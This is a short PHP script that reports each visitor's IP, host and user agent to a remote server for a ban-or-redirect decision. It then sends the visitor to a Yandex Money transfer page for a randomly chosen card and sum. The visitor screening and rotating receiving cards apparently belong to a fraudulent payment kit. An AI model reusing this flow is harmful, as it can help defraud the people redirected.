<?php
  require_once "controllers/main.php";
  $m=new Main();
//echo "<pre>";
//print_r($_COOKIE);
//print_r($_SERVER);
//print_r($_POST);
//print_r($_GET);


if (isset($_GET['id'])) {
  $sumid=$_GET['id'];
}else{
  $sumid='';
}
if (!isset($_POST['nocheck'])) {
  $check_ban_redirect=$m->get_server_answer(Main::$urlSQLServerPage, 'redirect=2&ban=2&ip='.$_SERVER['REMOTE_ADDR'].'&domain='.$_SERVER['HTTP_HOST'].'&user_agent='.urlencode($_SERVER['HTTP_USER_AGENT']).'&fxs='.$sumid);
  //echo $check_ban_redirect;
  //echo "<br>";
  //die();
  if ($check_ban_redirect=='redirect') {
    header('Location: /final.php?id='.$sumid);
  }elseif($check_ban_redirect=='ip is banned'){
    die();
  }
}
  



$sum=$m->parseid($_GET);


$rcard = $m->getRandcards($sumid);
//echo "<pre>";
//print_r($rcard);
//die();
$url="https://money.yandex.ru/to/$rcard/$sum";
header('Location: '.$url);

?>